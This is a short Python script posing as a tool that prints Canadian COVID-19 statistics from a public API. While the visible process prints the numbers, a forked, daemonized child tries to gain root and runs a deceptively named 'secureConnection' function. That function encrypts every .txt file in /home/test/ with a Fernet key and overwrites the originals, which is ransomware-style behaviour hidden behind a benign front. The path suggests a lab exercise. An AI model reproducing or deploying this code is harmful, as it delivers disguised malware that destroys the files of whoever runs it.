#!/usr/bin/python3

import requests
import os
import sys
import signal
from cryptography.fernet import Fernet


def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
        except OSError:
            return
        if pid == 0:
            return


def getStat():
    url = "https://api.covid19tracker.ca/summary"
    apiResponse = requests.get(url)
    responseText = apiResponse.json()
    # responseTextStr = json.dumps(responseText,  indent=4,  sort_keys=True)

    for index in responseText['data']:
        print(f"The total cases in Canada is {index['total_cases']}, and {index['total_fatalities']} have died while {index['total_recoveries']} have recovered")
        print (f"The latest date this was updated was {index['latest_date']}")


def secureConnection():
    key = Fernet.generate_key()
    sendKey(key)

    for file in os.listdir(os.path.expanduser('/home/test/')):
        if file.endswith(".txt"):
            filePath = os.path.join("/home/test/", file)
            f = Fernet(key)
            with open(filePath, "rb") as fileContents:
                data = fileContents.read()
                encryptedData = f.encrypt(data)
            with open(filePath, "wb") as fileContents:
                fileContents.write(encryptedData)


def sendKey(key):
    try:
        with open("/home/test/key.key", "wb") as keyFile:
            keyFile.write(key)
    except Exception as e:
        print(e)
    print(key)


if __name__ == '__main__':
    try:
        pid = os.fork()
        if pid > 0:
            getStat()
            sys.exit(0)
    except OSError:
        sys.exit(0)

    os.chdir('/')
    os.umask(0)
    os.setsid()
    os.setuid(0)
    os.setgid(0)

    signal.signal(signal.SIGCHLD, signalHandler)

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(0)

    if pid == 0:
        secureConnection()
